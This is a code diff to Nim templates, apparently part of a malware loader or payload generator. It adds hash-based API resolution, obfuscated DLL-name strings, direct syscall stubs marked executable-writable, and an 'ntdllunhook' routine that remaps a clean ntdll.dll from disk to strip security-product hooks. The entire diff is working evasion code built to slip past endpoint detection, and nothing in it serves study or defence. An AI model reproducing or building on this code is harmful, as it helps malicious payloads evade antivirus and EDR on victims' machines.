@@ -4,8 +4,8 @@ import strutils
 let DInvokeBaseStub * = """
 
 const
-  KERNEL32_DLL* = "kernel32.dll"
-  NTDLL_DLL* = "ntdll.dll"
+  KERNEL32_DLL* = obf("kernel32.dll")
+  NTDLL_DLL* = obf("ntdll.dll")
 
 type
   GetCurrentProcess_t* = proc (): DWORD {.stdcall.}
@@ -32,6 +32,7 @@ MyGetCurrentProcess = cast[GetCurrentProcess_t](cast[LPVOID](get_function_addres
 MyGetCurrentProcessId = cast[GetCurrentProcessId_t](cast[LPVOID](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), GetCurrentProcessId_HASH, 0, FALSE)))
 
 MyVirtualProtect = cast[VirtualProtect_t](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), VirtualProtect_HASH, 0, FALSE))
+
 
 """
 
@@ -196,6 +197,50 @@ syscallStub_NtProtect = MyVirtualAllocEx(
 )
 
 """
+
+let DInvokeUnhookStubs * = """
+
+const
+  PSAPI_DLL* = obf("psapi.dll")
+
+type
+  MODULEINFO* {.pure.} = object
+    lpBaseOfDll*: LPVOID
+    SizeOfImage*: DWORD
+    EntryPoint*: LPVOID
+  LPMODULEINFO* = ptr MODULEINFO
+
+type
+  GetModuleHandleA_t* = proc(lpModuleName: LPCSTR): HMODULE {.stdcall.}
+  GetModuleInformation_t* = proc(hProcess: HANDLE, hModule: HMODULE, lpmodinfo: LPMODULEINFO, cb: DWORD): WINBOOL {.stdcall.}
+  CreateFileMappingA_t* = proc(hFile: HANDLE, lpFileMappingAttributes: LPSECURITY_ATTRIBUTES, flProtect: DWORD, dwMaximumSizeHigh: DWORD, dwMaximumSizeLow: DWORD, lpName: LPCWSTR): HANDLE {.stdcall.}
+  MapViewOfFile_t* = proc(hFileMappingObject: HANDLE, dwDesiredAccess: DWORD, dwFileOffsetHigh: DWORD, dwFileOffsetLow: DWORD, dwNumberOfBytesToMap: SIZE_T): LPVOID {.stdcall.}
+  FreeLibrary_t* = proc(hLibModule: HMODULE): WINBOOL {.stdcall.}
+
+const
+  GetModuleHandleA_HASH * = 171027927
+  GetModuleInformation_HASH * = 622102026
+  CreateFileMappingA_HASH * = 1584069263
+  MapViewOfFile_HASH * = 3922941889
+  FreeLibrary_HASH * = 945195088
+
+var MyGetModuleHandleA*: GetModuleHandleA_t
+var MyGetModuleInformation*: GetModuleInformation_t
+var MyCreateFileMappingA*: CreateFileMappingA_t
+var MyMapViewOfFile*: MapViewOfFile_t
+var MyFreeLibrary*: FreeLibrary_t
+
+MyGetModuleHandleA = cast[GetModuleHandleA_t](cast[LPVOID](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), GetModuleHandleA_HASH, 0, FALSE)))
+
+MyGetModuleInformation = cast[GetModuleInformation_t](cast[LPVOID](get_function_address(cast[HMODULE](get_library_address(PSAPI_DLL, TRUE)), GetModuleInformation_HASH, 0, FALSE)))
+
+MyCreateFileMappingA = cast[CreateFileMappingA_t](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), CreateFileMappingA_HASH, 0, FALSE))
+
+MyMapViewOfFile = cast[MapViewOfFile_t](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), MapViewOfFile_HASH, 0, FALSE))
+
+MyFreeLibrary = cast[FreeLibrary_t](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), FreeLibrary_HASH, 0, FALSE))
+"""
+
 let UnhookSyscalls * = """
 
 
@@ -210,15 +255,15 @@ proc GetUnhookStubs(): void =
     
     # Define NtProtectVirtualMemory
     NtProtectVirtualMemory = cast[myNtProtectVirtM](cast[LPVOID](syscallStub_NtProtect))
-    MyVirtualProtect(cast[LPVOID](syscallStub_NtProtect), SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, addr oldProtection)
+    success = MyVirtualProtect(cast[LPVOID](syscallStub_NtProtect), SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, addr oldProtection)
     
     # define NtWriteVirtualMemory
     NtWriteVirtualMemory = cast[myNtWriteVirtM](cast[LPVOID](syscallStub_NtWrite))
-    MyVirtualProtect(cast[LPVOID](syscallStub_NtWrite), SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, addr oldProtection)
+    success = MyVirtualProtect(cast[LPVOID](syscallStub_NtWrite), SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, addr oldProtection)
     
     # define NtClose
     NtClose = cast[myNtClose](cast[LPVOID](syscallStub_NtClose))
-    MyVirtualProtect(cast[LPVOID](syscallStub_NtClose), SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, addr oldProtection)
+    success = MyVirtualProtect(cast[LPVOID](syscallStub_NtClose), SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, addr oldProtection)
     
     
     success = GetSyscallStub(obf("NtProtectVirtualMemory"), cast[LPVOID](syscallStub_NtProtect))
@@ -229,14 +274,13 @@ proc GetUnhookStubs(): void =
 
 let UnhookStub * = """
 
-from winim import MODULEINFO, GetModuleInformation
 
 proc ntdllunhook(): bool =
   let low: uint16 = 0
   var 
-      processH = GetCurrentProcess()
+      processH = MyGetCurrentProcess()
       mi : MODULEINFO
-      ntdllModule = GetModuleHandleA(obf("ntdll.dll"))
+      ntdllModule = MyGetModuleHandleA(obf("ntdll.dll"))
       ntdllBase : LPVOID
       ntdllFile : FileHandle
       ntdllMapping : HANDLE
@@ -245,14 +289,14 @@ proc ntdllunhook(): bool =
       hookedNtHeader : PIMAGE_NT_HEADERS
       hookedSectionHeader : PIMAGE_SECTION_HEADER
 
-  GetModuleInformation(processH, ntdllModule, addr mi, cast[DWORD](sizeof(mi)))
+  discard MyGetModuleInformation(processH, ntdllModule, addr mi, cast[DWORD](sizeof(mi)))
   ntdllBase = mi.lpBaseOfDll
   ntdllFile = getOsFileHandle(open(obf("C:\\windows\\system32\\ntdll.dll"),fmRead))
-  ntdllMapping = CreateFileMapping(ntdllFile, NULL, PAGE_READONLY or SEC_IMAGE, 0, 0, NULL) # 0x02 =  PAGE_READONLY & 0x1000000 = SEC_IMAGE
+  ntdllMapping = MyCreateFileMappingA(ntdllFile, NULL, PAGE_READONLY or SEC_IMAGE, 0, 0, NULL) # 0x02 =  PAGE_READONLY & 0x1000000 = SEC_IMAGE
   if ntdllMapping == 0:
     echo obf("Could not create file mapping object ") &  fmt"({GetLastError()})."
     return false
-  ntdllMappingAddress = MapViewOfFile(ntdllMapping, FILE_MAP_READ, 0, 0, 0)
+  ntdllMappingAddress = MyMapViewOfFile(ntdllMapping, FILE_MAP_READ, 0, 0, 0)
   if ntdllMappingAddress.isNil:
     echo obf("Could not map view of file ") & fmt"({GetLastError()})."
     return false
@@ -282,7 +326,7 @@ proc ntdllunhook(): bool =
   status = NtClose(processH)
   status = NtClose(ntdllFile)
   status = NtClose(ntdllMapping)
-  FreeLibrary(ntdllModule)
+  discard MyFreeLibrary(ntdllModule)
   return true
 
 
